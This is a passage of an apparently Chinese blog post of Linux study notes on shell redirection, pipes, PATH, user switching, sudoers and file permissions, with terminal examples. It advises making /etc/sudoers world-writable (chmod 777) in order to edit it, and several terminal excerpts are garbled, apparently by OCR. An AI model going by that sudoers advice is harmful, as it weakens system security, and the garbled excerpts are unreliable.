class="line">[root@localhost test1]# echo &quot;hello bit1&quot; &gt;&gt; file4</span><br><span class="line">[root@localhost test1]# cat file4 #通过多此&gt;&gt;,我们发现内容是被追加到文件结尾的,叫做追加重定向</span><br><span class="line">hello bit</span><br><span class="line">hello bit1</span><br><span class="line">hello bit2</span><br><span class="line">hello bit1</span><br><span class="line">#输入重定向</span><br><span class="line">[root@localhost test1]# cat &gt; file1</span><br><span class="line">hello</span><br><span class="line">bit</span><br><span class="line">besd^Ht^H^H^H^[[4~^[[4~ #ctrl+d结束,Delete键不能删除</span><br><span class="line">[root@localhost test1]# cat file1 #可以看出,如果cat后面没有紧跟数据源文件,默认从标准输入获取数据</span><br><span class="line">hello</span><br><span class="line">bit</span><br><span class="line">best</span><br><span class="line">[root@localhost test1]# ll</span><br><span class="line">total 8</span><br><span class="line">-rw-r--r--. 1 root root 28 Oct 31 07:50 file1</span><br><span class="line">-rw-r--r--. 1 root root  0 Oct 31 07:46 file2</span><br><span class="line">-rw-r--r--. 1 root root  0 Oct 31 07:46 file3</span><br><span class="line">-rw-r--r--. 1 root root 43 Oct 31 07:48 file4</span><br><span class="line">[root@localhost test1]# cat file4</span><br><span class="line">hello bit</span><br><span class="line">hello bit1</span><br><span class="line">hello bit2</span><br><span class="line">hello bit1</span><br><span class="line">[root@localhost test1]# cat &lt; file4 #既然cat要打印文件,前提也是先读取file4,所以也可以这样写</span><br><span class="line">hello bit</span><br><span class="line">hello bit1</span><br><span class="line">hello bit2</span><br><span class="line">hello bit1</span><br><span class="line">[root@localhost test1]# cat &lt; file4 &gt; file3 #读取再写入</span><br><span class="line">[root@localhost test1]# cat file3</span><br><span class="line">hello bit</span><br><span class="line">hello bit1</span><br><span class="line">hello bit2</span><br><span class="line">[root@localhost test1]# cat file4 #原数据保留</span><br><span class="line">hello bit</span><br><span class="line">hello bit1</span><br><span class="line">hello bit2</span><br><span class="line">hello bit1</span><br></pre></td></tr></table></figure><p>cat &gt;输入时键盘的删除键也会被读入,虽然再次cat不显示,但内存不一样,可以用vi看出来</p><p>代码0,1,2?是什么</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[whb@vM-O-3-centos test]$ find /home -name test.cfind: &#x27; /home/w1&#x27;: Permission denied #报错信息</span><br><span class="line">/home/wudu/work/linux-57/1inux-1esson7/signal_test/test.c#正常信息/home/wudu/work/1inux-57/1inux-1esson7/sigaction_test/test.c#正常信息...</span><br><span class="line">[whb@VM-O-3-centos test]$ find /home -name test.c &gt; test_list #发现并不是所有信息都被重定向find: &#x27; /home/w1 &#x27;: Permission denied</span><br><span class="line">#报错信息并没有被写入目标文件</span><br><span class="line">[whb@vM-O-3-centos test]$ cat test_list</span><br><span class="line">/home/wudu/work/1inux-57/1inux-1esson7/signal_test/test.c#正常信息被写入了/home/wudu/work /1inux-57/1inux-lesson7/sigaction_test/test.c</span><br><span class="line">...</span><br><span class="line">#1:代表标准输出#2:代表标准错误</span><br><span class="line"># 但是他们两个默认都会往显示器打印，像上面的情况，打印输出到显示器会发生混乱</span><br><span class="line">#只打印正常信息</span><br><span class="line">[whb@VM-O-3-centos test]$ find /home -name test.c 2&gt;err.list/home/wudu/work/linux-57/1inux-lesson7/signal_test/test.c/home/wudu/work/linux-57/linux-lesson7/sigaction_test/test.c/home/wudu/work/1inux-57/linux-lesson7/sigmask/test.c</span><br><span class="line">/home/wudu/work/linux-57/linux-1esson15/test/test.c/home/wudu/work / linux-57/1inux-1esson4/pipesize/test.c/home/wudu/work/linux-57/1inux-lesson5/testmkfifo/test.c/home/wudu/work / linux-57/linux-lesson5/shmtest/test.c/home/wudu/work / linux-57/1inux-lesson3/dynamic/test.c/home/wudu/work/linux-57/linux-lesson3 /static/test.c...</span><br><span class="line">[whb@vM-O-3-centos test]$ cat err.list #错误信息被单独分离出来find: ‘/home/w1’ : Permission denied</span><br><span class="line">find: &#x27; /home/sly&#x27;: Permission deniedfind: ‘ /home/zwc&#x27;: Permission deniedfind: ‘/home/cpx&#x27;: Permission denied</span><br><span class="line">然</span><br><span class="line">find: ‘ /home/gb&#x27;: Permission denied</span><br><span class="line">find: &#x27; /home/bss&#x27;: Permission denied</span><br><span class="line">#只打印错误信息</span><br><span class="line">#上面默认就是</span><br><span class="line">#正常和错误信息都重定向到文件中</span><br><span class="line">[whb@vM-O-3-centos test]$ find /home -name test,c &gt;info.list 2&gt;&amp;1[whb@vM-O-3-centos test]$ cat info.7ist</span><br><span class="line">find: &#x27; /home/wl’ : Permission denied</span><br><span class="line">find: &#x27; /home/wudu/ . local&#x27; : Permission denied</span><br><span class="line">/home/wudu/work/linux-57/linux-lesson7/sighal test/test.c/home/wudu/work/linux-57/linux-lesson7[sigaction_test/test.c/home/wudu/work/linux-57/1inux -Pesson7 sigmask/test.c</span><br><span class="line">...</span><br><span class="line">#2&gt;&amp;1??又是什么鬼?这个底层是怎么实现的。目前还不能讲，比特后期的课程才有</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>显示器中的输出信息有错误的也有正确得,大于(&gt;)只把正确的写入,即只重定向标准输出,如果要都打印进去,在命令后面加上2&gt;&amp;1即可</p><h4 id="x2F-dev-x2F-null"><a href="#x2F-dev-x2F-null" class="headerlink" title="&#x2F;dev&#x2F;null"></a>&#x2F;dev&#x2F;null</h4><p>垃圾桶黑洞设备，如果我知道有错误信息，但是我不想要，我想凡是错误信息直接丢弃，习惯写法是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[whb@vM-O-3-centos test]$ find /home -name test.c 2&gt;/dev/nu11#便只显示正常信息了/home/wudu/work/linux-57/linux-lesson7/signal_test/test.c</span><br><span class="line">/home/wudu/work/1inux-57/linux-lesson7/sigaction_test/test.c/ home/wudu/work/linux-57/linux-1esson7/sigmask/test.c</span><br><span class="line">/home/wudu/work/ linux-57/linux-1esson15/test/test.c/home/wudu/work/linux-57/1inux-lesson4/pipesize/test.c/home/wudu/work/linux-57/linux-1esson5/testmkfifo/test.c</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="Linux管道命令的理解和操作"><a href="#Linux管道命令的理解和操作" class="headerlink" title="Linux管道命令的理解和操作"></a>Linux管道命令的理解和操作</h3><p>命令是可以产生数据的，如果我们还要多输出数据进行加工，甚至想多次加工，就需要使用管道</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# last #显示正在或者最近登陆linux的用户信息</span><br><span class="line">root     pts/0        192.168.174.1    Tue Oct 31 06:45   still logged in   </span><br><span class="line">root     pts/1        192.168.174.1    Tue Oct 31 06:34 - 06:45  (00:11)    </span><br><span class="line">root     pts/0        192.168.174.1    Tue Oct 31 04:51 - 06:34  (01:43)    </span><br><span class="line">(unknown :0           :0               Tue Oct 31 04:50   still logged in   </span><br><span class="line">reboot   system boot  3.10.0-514.el7.x Tue Oct 31 04:49 - 09:06  (04:16)    </span><br><span class="line">root     pts/0        192.168.174.1    Mon Oct 30 20:01 - crash  (08:48)    </span><br><span class="line">(unknown :0           :0               Mon Oct 30 20:00 - crash  (08:49)    </span><br><span class="line">reboot   system boot  3.10.0-514.el7.x Mon Oct 30 20:00 - 09:06  (13:05) </span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">#如果我只想看到5条信息呢 </span><br><span class="line">[root@localhost ~]# last | head -5 #其中&quot;|&quot;就是管道,head时一个获取文本行的工具,可以单独介绍</span><br><span class="line">root     pts/0        192.168.174.1    Tue Oct 31 06:45   still logged in   </span><br><span class="line">root     pts/1        192.168.174.1    Tue Oct 31 06:34 - 06:45  (00:11)    </span><br><span class="line">root     pts/0        192.168.174.1    Tue Oct 31 04:51 - 06:34  (01:43)    </span><br><span class="line">(unknown :0           :0               Tue Oct 31 04:50   still logged in   </span><br><span class="line">reboot   system boot  3.10.0-514.el7.x Tue Oct 31 04:49 - 09:07  (04:17) </span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">#如果我只想看到我(root)的登陆历史信息呢?</span><br><span class="line">[root@localhost ~]# last | grep &quot;root&quot;</span><br><span class="line">root     pts/0        192.168.174.1    Tue Oct 31 06:45   still logged in   </span><br><span class="line">root     pts/1        192.168.174.1    Tue Oct 31 06:34 - 06:45  (00:11)    </span><br><span class="line">root     pts/0        192.168.174.1    Tue Oct 31 04:51 - 06:34  (01:43)    </span><br><span class="line">root     pts/0        192.168.174.1    Mon Oct 30 20:01 - crash  (08:48)    </span><br><span class="line">root     pts/1        192.168.174.1    Tue Oct 24 04:38 - 04:38  (00:00)    </span><br><span class="line">root     pts/0        :0               Tue Oct 24 04:30 - 04:39  (00:08)    </span><br><span class="line">root     :0           :0               Tue Oct 24 04:30 - 04:39  (00:08)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">#如果我只想看到我的历史登陆时间?要用到awk</span><br><span class="line">[root@localhost ~]# last | grep &quot;root&quot; | awk &#x27;&#123;print $1,$4,$5,$6,$7&#125;&#x27;</span><br><span class="line">root Tue Oct 31 06:45</span><br><span class="line">root Tue Oct 31 06:34</span><br><span class="line">root Tue Oct 31 04:51</span><br><span class="line">root Mon Oct 30 20:01</span><br><span class="line">root Tue Oct 24 04:38</span><br><span class="line">root Tue Oct 24 04:30</span><br><span class="line">root Tue Oct 24 04:30</span><br><span class="line">root Mon Oct 23 19:08</span><br><span class="line">root Tue Jul 25 01:33</span><br><span class="line">root Tue Jul 25 01:32</span><br><span class="line">root Tue Jul 25 01:14</span><br><span class="line">root Tue Jul 25 01:14</span><br><span class="line">root Tue Jul 25 01:09</span><br><span class="line">root Tue Nov 16 21:07</span><br></pre></td></tr></table></figure><p>可见，管道是可以级联多条命令的，每条命令的结果输出，都作为输入，导入下一条命令。有点像流水线</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20231101001146154.png" alt="image-20231101001146154"></p><p>理论上，管道的基本操作就完了，实际上，如果站在日常使用就够了，但是如果想面试大厂，至少有两方面问题需要深究?</p><ul><li>除了上面的文本处理工具，还有哪些文本处理工具你都使用过，各自有什么特征?·</li><li>站在操作系统层面，管道的底层原理是什么?</li></ul><h3 id="Linux环境变量与PATH"><a href="#Linux环境变量与PATH" class="headerlink" title="Linux环境变量与PATH"></a>Linux环境变量与PATH</h3><p>假设我们用c写一个输出hello world!的程序</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# cat test.c</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">    printf(&quot;hello world\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">[root@localhost ~]# gcc -o mycmd test.c</span><br><span class="line">[root@localhost ~]# ./mycmd</span><br><span class="line">hello world</span><br><span class="line">#./也可以认为是一种命令</span><br><span class="line">#想ls,就在/bin/ls or/usr/bin/ls,为什么执行的时候可以不带路径呢</span><br></pre></td></tr></table></figure><p>环境变量PATH<br>是一个路径集，命令再被执行时，系统会在环境变量PATH中进行路径查找，如果找到，就停止查找，执行命令。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# echo $PATH #不同环境,平台的内容可能不同</span><br><span class="line">/usr/local/soft/java/jdk1.8.0_40/bin:/usr/local/soft/java/jdk1.8.0_40/jre/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin</span><br><span class="line">$:用来显示PATH环境变量的内容</span><br><span class="line">#各个路径以:作为分隔符,每个区域代表一个搜索路径</span><br></pre></td></tr></table></figure><p>这也就解释了，为何ls不需要带路径，因为ls所在的路径，本身就在PATH环境变量列表当中。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# which ls</span><br><span class="line">alias ls=&#x27;ls --color=auto&#x27;</span><br><span class="line">/usr/bin/ls</span><br></pre></td></tr></table></figure><p>那么问题来了，我也想让我的’hello world’程序执行的时候不带.&#x2F;这样的路径,怎么办呢?</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#方法一</span><br><span class="line">[whb@vM-O-3-centos test]$ mycmd-bash: mycmd: command not found</span><br><span class="line">[whb@vM-O-3-centos test]$ sudo cp mycmd /usr/bin[sudo] password for whb:</span><br><span class="line">[whb@vM-O-3-centos test]$ 1s /usr/bin/mycmd/usr/bin/mycmd</span><br><span class="line">[whb@VM-O-3-centos test]$ mycmd#但是千万不要这样干，因为会‘污染&#x27;指令集he1lo wor1d</span><br><span class="line">#方法二</span><br><span class="line">[whb@vM-O-3-centos test]$ echo $PATH</span><br><span class="line">/usr/loca1/jdk8/bin:/usr/loca1/jdk8/jre/bin:/usr/loca1/bin:/usr/bin: [usr/Toca1/sbin:/usr/sbin : /home/whb / .1oca1/bin : /home/whb/bin</span><br><span class="line">[whb@vM-O-3-centos test]$ pwd#查看自己当前处于哪个目录/home/whb/test</span><br><span class="line">[whb@VM-0-3-centos test]s export PATH=$PATH:/home/whb/test#导出新的环境变量，加上程序所在的路径[whb@vM-0-3-centos test]$ echo $PATH</span><br><span class="line">/usr/loca1/jdk8/bin:/usr/local/jdk8/jre/bin;/eseloca1/bin:/usr/bin:/usr/local/sbin:/usr/sbin : /home/whb / .loca1/bin:/home/whb/bin : / home/vwhb/tes t</span><br><span class="line">[whb@vM-O-3-centos test]$ sudo rm /usr/bin/mycmd#删掉在/usr/bin路径下的可执行程序[whb@vM-O-3-centos test]$ which myemd #mycmdt经能通过环境变量被找到</span><br><span class="line">~/test/mycmd</span><br><span class="line">[whb@vM-0-3-centos test]$ mycmd就可以不带路径he1lo wor1d</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们在思考一下，几乎可以得出如下结论;</p><ul><li>系统本身会提供某种全局育找属性，帮我们找到特定的模块&#x2F;程序</li></ul><p>其实，编译器内部也有类似的功能，想想，为何我们#includec头文件&gt;,并没有指明头文件在哪里，但是编译器也能帮我们找到并展开，包括我们也并没有指明我们的程序依赖哪些第三方库，编译器也能找到。</p><h3 id="插话-vim编辑器里Tab键缩进不是4个空格怎么调"><a href="#插话-vim编辑器里Tab键缩进不是4个空格怎么调" class="headerlink" title="插话,vim编辑器里Tab键缩进不是4个空格怎么调"></a>插话,vim编辑器里Tab键缩进不是4个空格怎么调</h3><ul><li><p>第一步,找到vimrc文件所在位置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># find / -name vimrc</span><br></pre></td></tr></table></figure></li><li><p>第二步: 找到以后用vim打开vimrc文件并增加下面两行代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set ts=4</span><br><span class="line">set expandtab</span><br></pre></td></tr></table></figure><p>加在set ruler或即可</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20231101002709400.png" alt="image-20231101002709400"></p></li></ul><h2 id="Linux权限理解"><a href="#Linux权限理解" class="headerlink" title="Linux权限理解"></a>Linux权限理解</h2><p><a href="https://blog.csdn.net/ghjzzhg/article/details/94388439">linux中&#x2F;etc&#x2F;pam.d&#x2F;system-auth文件详解</a>该文件可以用来限制密码强度，输入次数等，可提高安全性</p><h3 id="Linux用户的概念"><a href="#Linux用户的概念" class="headerlink" title="Linux用户的概念"></a>Linux用户的概念</h3><h4 id="Linux下有两种用户：超级用户（root）、普通用户"><a href="#Linux下有两种用户：超级用户（root）、普通用户" class="headerlink" title="Linux下有两种用户：超级用户（root）、普通用户"></a>Linux下有两种用户：超级用户（root）、普通用户</h4><ul><li>超级用户:可以再linux系统下做任何事情，不受限制</li><li>普通用户:在linux下做有限的事情。</li><li>超级用户的命令提示符是”#”，普通用户的命令提示符是”$”。</li></ul><h3 id="角色切换"><a href="#角色切换" class="headerlink" title="角色切换"></a>角色切换</h3><h4 id="普通用户切换超级用户"><a href="#普通用户切换超级用户" class="headerlink" title="普通用户切换超级用户"></a>普通用户切换超级用户</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost ~]$ whoami</span><br><span class="line">youzipii</span><br><span class="line">[youzipii@localhost ~]$ sudo -s</span><br><span class="line">[sudo] password for youzipii: </span><br><span class="line">[root@localhost youzipii]# whoami</span><br><span class="line">root</span><br><span class="line">[root@localhost youzipii]# </span><br></pre></td></tr></table></figure><h4 id="超级用户切换到普通用户"><a href="#超级用户切换到普通用户" class="headerlink" title="超级用户切换到普通用户"></a>超级用户切换到普通用户</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost ~]$ sudo -s</span><br><span class="line">[root@localhost youzipii]# whoami</span><br><span class="line">root</span><br><span class="line">[root@localhost youzipii]# exit</span><br><span class="line">exit</span><br><span class="line">[youzipii@localhost ~]$ whoami</span><br><span class="line">youzipii</span><br></pre></td></tr></table></figure><h4 id="怎么查看当前linux有多少用户-好文-https-www-cnblogs-com-will-wu-p-12937015-html"><a href="#怎么查看当前linux有多少用户-好文-https-www-cnblogs-com-will-wu-p-12937015-html" class="headerlink" title="怎么查看当前linux有多少用户[好文][https://www.cnblogs.com/will-wu/p/12937015.html]"></a>怎么查看当前linux有多少用户[好文][<a href="https://www.cnblogs.com/will-wu/p/12937015.html]">https://www.cnblogs.com/will-wu/p/12937015.html]</a></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd | cut -f 1 -d :</span><br><span class="line">[youzipii@localhost ~]$ cat /etc/passwd | cut -f 1 -d:</span><br><span class="line">root</span><br><span class="line">bin</span><br><span class="line">daemon</span><br><span class="line">adm</span><br><span class="line">lp</span><br><span class="line">...</span><br><span class="line"># 注：| 是管道，把cat的输出传给cut处理；后面的cut取出每一行的以：分割的第一栏</span><br><span class="line">[youzipii@localhost ~]$ cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">...</span><br><span class="line">/etc/passwd 文件存放的是用户信息.由六个分号组成的7个信息,分别是:</span><br><span class="line">用户名 （magesh）： 已创建用户的用户名，字符长度 1 个到 12 个字符。</span><br><span class="line">密码（x）：代表加密密码保存在 `/etc/shadow 文件中。</span><br><span class="line">用户 ID（506）：代表用户的 ID 号，每个用户都要有一个唯一的 ID 。UID 号为 0 的是为 root 用户保留的，UID 号 1 到 99 是为系统用户保留的，UID 号 100-999 是为系统账户和群组保留的。</span><br><span class="line">群组 ID （507）：代表群组的 ID 号，每个群组都要有一个唯一的 GID ，保存在 /etc/group文件中。</span><br><span class="line">用户信息（2g Admin - Magesh M）：代表描述字段，可以用来描述用户的信息（LCTT 译注：此处原文疑有误）。</span><br><span class="line">家目录（/home/mageshm）：代表用户的家目录。</span><br><span class="line">Shell（/bin/bash）：代表用户使用的 shell 类型。</span><br></pre></td></tr></table></figure><h4 id="报错-用户不在sudoers文件中"><a href="#报错-用户不在sudoers文件中" class="headerlink" title="报错(用户不在sudoers文件中)"></a>报错(用户不在sudoers文件中)</h4><p>在使用sudo -s命令时,出现以下情况</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">youzipii is not in the sudoers file.  This incident will be reported.</span><br></pre></td></tr></table></figure><p>解决方法:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 第一步先su - 进入root模式</span><br><span class="line"># 第二步再去修改/etc/sudoers里的内容,在root下面加入用户名,其他与root一致</span><br><span class="line"># 但文件权限可能不够,需要先给权限</span><br><span class="line">[root@localhost ~]# chmod 777 /etc/sudoers</span><br><span class="line">[root@localhost ~]# vi /etc/sudoers</span><br><span class="line">...</span><br><span class="line">## Allow root to run any commands anywhere </span><br><span class="line">root    ALL=(ALL)   ALL</span><br><span class="line">youzipii ALL=(ALL)     ALL</span><br><span class="line">...</span><br><span class="line">[root@localhost ~]# chmod u-wx,o-wx,g-rwx /etc/sudoers</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>另外，用户角色切换还有其他方式，还有很多细节.<br>还有，Linux是多用户的，所以可以同时登陆多人，甚至你可以切成别人的身份，但是目前我们的Linux机器，大都是自己使用，所以先不考虑这些。</p><h3 id="Linux权限管理"><a href="#Linux权限管理" class="headerlink" title="Linux权限管理"></a>Linux权限管理</h3><h4 id="文件访问者的分类"><a href="#文件访问者的分类" class="headerlink" title="文件访问者的分类"></a>文件访问者的分类</h4><ul><li>文件和文件目录的所有者:u—User</li><li>文件和文件目录的所有者所在的组的用户g—Group </li><li>其它用户:o—Others(外国人)</li></ul><h4 id="文件类型和访问权限（事务属性）"><a href="#文件类型和访问权限（事务属性）" class="headerlink" title="文件类型和访问权限（事务属性）"></a>文件类型和访问权限（事务属性）</h4><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20231101185252874.png" alt="image-20231101185252874"></p><h3 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h3><ul><li>d:文件夹-︰普通文件</li><li>1∶软链接（类似windows的快捷方式)</li><li>b:块设备文件（例如硬盘、光驱等)</li><li>p:管道文件</li><li>c:字符设备文件（例如屏幕等串口设备)</li><li>s:套接口文件</li></ul><h4 id="file指令"><a href="#file指令" class="headerlink" title="file指令"></a>file指令</h4><p>功能说明：辨识文件类型</p><p>语法：file [选项] 文件或目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost home]$ cd youzipii/</span><br><span class="line">[youzipii@localhost ~]$ file ../youzipii/</span><br><span class="line">../youzipii/: directory</span><br><span class="line">[youzipii@localhost ~]$ file youzipii.txt</span><br><span class="line">youzipii.txt: empty</span><br><span class="line">[youzipii@localhost ~]$ echo &quot;www.baidu.com&quot; &gt;&gt; youzipii.txt</span><br><span class="line">[youzipii@localhost ~]$ file youzipii.txt</span><br><span class="line">youzipii.txt: ASCII text</span><br></pre></td></tr></table></figure><h4 id="基本权限设置"><a href="#基本权限设置" class="headerlink" title="基本权限设置"></a>基本权限设置</h4><ul><li>读（r&#x2F;4) : Read对文件而言，具有读取文件内容的权限;对目录来说，具有浏览该目录信息的权限</li><li>写(w&#x2F;2) : Write对文件而言，具有修改文件内容的权限;对目录来说具有删除移动目录内文件的权限</li><li>执行(x&#x2F;1) : execute对文件而言，具有执行文件的权限;对目录来说，具有进入目录的权限</li><li>“—“表示不具有该项权限</li></ul><h4 id="文件权限值得表示方法"><a href="#文件权限值得表示方法" class="headerlink" title="文件权限值得表示方法"></a>文件权限值得表示方法</h4><p>字符表示方法</p><table><thead><tr><th>Linux表示</th><th>说明</th><th>Linux表示</th><th>说明</th></tr></thead><tbody><tr><td>r–</td><td>只读</td><td>-w-</td><td>仅可写</td></tr><tr><td>–x</td><td>仅可执行</td><td>rw-</td><td>读可写</td></tr><tr><td>-wx</td><td>可写和执行</td><td>r-x</td><td>可读可执行</td></tr><tr><td>rwx</td><td>可读可写可执行</td><td>—</td><td>无权限</td></tr></tbody></table><table><thead><tr><th>权限符号</th><th>八进制</th><th>二进制</th></tr></thead><tbody><tr><td>r</td><td>4</td><td>100</td></tr><tr><td>w</td><td>2</td><td>010</td></tr><tr><td>x</td><td>1</td><td>001</td></tr><tr><td>rw</td><td>6</td><td>110</td></tr><tr><td>rx</td><td>5</td><td>101</td></tr><tr><td>wx</td><td>3</td><td>011</td></tr><tr><td>rwx</td><td>7</td><td>111</td></tr><tr><td>—</td><td>0</td><td>000</td></tr></tbody></table><h4 id="文件权限访问得相关设置方法"><a href="#文件权限访问得相关设置方法" class="headerlink" title="文件权限访问得相关设置方法"></a>文件权限访问得相关设置方法</h4><h5 id="chmod功能：设置访问权限"><a href="#chmod功能：设置访问权限" class="headerlink" title="chmod功能：设置访问权限"></a>chmod功能：设置访问权限</h5><p>格式：chmod [参数] 权限 文件明</p><p>常用选项：</p><ul><li>R-&gt;递归修改目录文件的权限</li><li>说明:只有文件的拥有者和root才可以改变文件的权限</li></ul><p><em>chmod命令权限值的格式</em></p><p>① 用户表示符 +&#x2F;-&#x3D;权限字符</p><ul><li>+:向权限范围增加权限代号所表示的权限</li><li>-:向权限范围取消权限代号所表示的权限</li><li>&#x3D;:向权限范围赋予权限代号所表示的权限</li><li>用户符号:</li><li>u:拥有者</li><li>g:拥有者同组者</li><li>o:其它用户</li><li>a:所有用户</li></ul><p><strong>实例</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost ~]$ ll</span><br><span class="line">total 4</span><br><span class="line">-rw-rw-r--. 1 youzipii youzipii 14 Nov  1 04:04 youzipii.txt</span><br><span class="line">[youzipii@localhost ~]$ chmod u-rw,g-rw,o-r youzipii.txt</span><br><span class="line">[youzipii@localhost ~]$ ll</span><br><span class="line">total 4</span><br><span class="line">----------. 1 youzipii youzipii 14 Nov  1 04:04 youzipii.txt</span><br><span class="line">[youzipii@localhost ~]$ chmod u+w,a=x youzipii.txt</span><br><span class="line">[youzipii@localhost ~]$ ll</span><br><span class="line">total 4</span><br><span class="line">---x--x--x. 1 youzipii youzipii 14 Nov  1 04:04 youzipii.txt</span><br></pre></td></tr></table></figure><p>②三位8进制数字</p><p><strong>实例</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost ~]$ chmod 000 youzipii.txt</span><br><span class="line">[youzipii@localhost ~]$ ll</span><br><span class="line">total 4</span><br><span class="line">----------. 1 youzipii youzipii 14 Nov  1 04:04 youzipii.txt</span><br><span class="line">[youzipii@localhost ~]$ chmod 664 youzipii.txt</span><br><span class="line">[youzipii@localhost ~]$ ll</span><br><span class="line">total 4</span><br><span class="line">-rw-rw-r--. 1 youzipii youzipii 14 Nov  1 04:04 youzipii.txt</span><br></pre></td></tr></table></figure><h5 id="chown功能：修改文件拥有者"><a href="#chown功能：修改文件拥有者" class="headerlink" title="chown功能：修改文件拥有者"></a>chown功能：修改文件拥有者</h5><p>格式：chown [参数] 用户名，文件名</p><p><strong>实例</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># chown user1 f1</span><br><span class="line"># chwon -R user1 filegroup1</span><br></pre></td></tr></table></figure><h5 id="chgrp功能：修文件或目录所属组"><a href="#chgrp功能：修文件或目录所属组" class="headerlink" title="chgrp功能：修文件或目录所属组"></a>chgrp功能：修文件或目录所属组</h5><p>格式：chgrp [参数] 用户组名 文件名</p><p>常用选项： -R 递归修改文件或目录所属组</p><p><strong>实例</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># chgrp users /abc/f2</span><br></pre></td></tr></table></figure><h5 id="使用sudo分配权限"><a href="#使用sudo分配权限" class="headerlink" title="使用sudo分配权限"></a>使用sudo分配权限</h5><p>（1） 修改&#x2F;etc&#x2F;sudoers文件分配文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 740 /etc/sudoers</span><br><span class="line">vi /etc/sudoer</span><br></pre></td></tr></table></figure><p>（2） 使用sudo调用授权命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost ~]$ whoami</span><br><span class="line">youzipii</span><br><span class="line">[youzipii@localhost ~]$ sudo -u root whoami</span><br><span class="line">root</span><br><span class="line">...</span><br><span class="line">or</span><br><span class="line">...</span><br><span class="line">[youzipii@localhost ~]$ whoami</span><br><span class="line">youzipii</span><br><span class="line">[sudo] password for youzipii:</span><br><span class="line">[youzipii@localhost ~]$ sudo whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure><h3 id="目录权限"><a href="#目录权限" class="headerlink" title="目录权限"></a>目录权限</h3><ul><li>可执行权限:如果目录没有可执行权限,则无法cd到目录中.</li><li>可读权限:如果目录没有可读权限,则无法用ls等命令查看目录中的文件内容.</li><li>可写权限:如果目录没有可写权限,则无法在目录中创建文件,也无法在目录中删除文件.</li></ul><p>换句话来讲,就是只要用户具有目录的写权限,用户就可以删除目录中的文件,而不论这个用户是否有这个文件的写权限.<br>这好像不太科学啊,我张三创建的一个文件,凭什么被你李四可以删掉?我们用下面的过程印证一下.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost ~]$ sudo chmod 777 fortest</span><br><span class="line">[youzipii@localhost ~]$ ll</span><br><span class="line">total 4</span><br><span class="line">drwxrwxrwx. 2 root  root      6 Nov  1 04:38 fortest</span><br><span class="line">-rw-rw-r--. 1 user1 youzipii 14 Nov  1 04:04 youzipii.txt</span><br><span class="line">[youzipii@localhost ~]$ ls -ld fortest/</span><br><span class="line">drwxrwxrwx. 2 root root 6 Nov  1 04:38 fortest/</span><br><span class="line">[youzipii@localhost ~]$ cd fortest/</span><br><span class="line">[youzipii@localhost fortest]$ touch test.c</span><br><span class="line">[youzipii@localhost fortest]$ ll</span><br><span class="line">total 0</span><br><span class="line">-rw-rw-r--. 1 youzipii youzipii 0 Nov  1 04:41 test.c</span><br><span class="line">[youzipii@localhost fortest]$ sudo touch test_root.c</span><br><span class="line">[youzipii@localhost fortest]$ ll</span><br><span class="line">total 0</span><br><span class="line">-rw-rw-r--. 1 youzipii youzipii 0 Nov  1 04:41 test.c #普通用户</span><br><span class="line">-rw-r--r--. 1 root     root     0 Nov  1 04:41 test_root.c #超级用户</span><br><span class="line">[youzipii@localhost fortest]$ whoami</span><br><span class="line">youzipii</span><br><span class="line">[youzipii@localhost fortest]$ rm test_root.c</span><br><span class="line">rm: remove write-protected regular empty file ‘test_root.c’? y</span><br><span class="line">[youzipii@localhost fortest]$ ll</span><br><span class="line">total 0</span><br><span class="line">-rw-rw-r--. 1 youzipii youzipii 0 Nov  1 04:41 test.c #删除成功</span><br></pre></td></tr></table></figure><p>为了解决这个问题，Linux引入了粘滞位</p><h4 id="粘滞位-好文-https-blog-csdn-net-better1914-article-details-53943081"><a 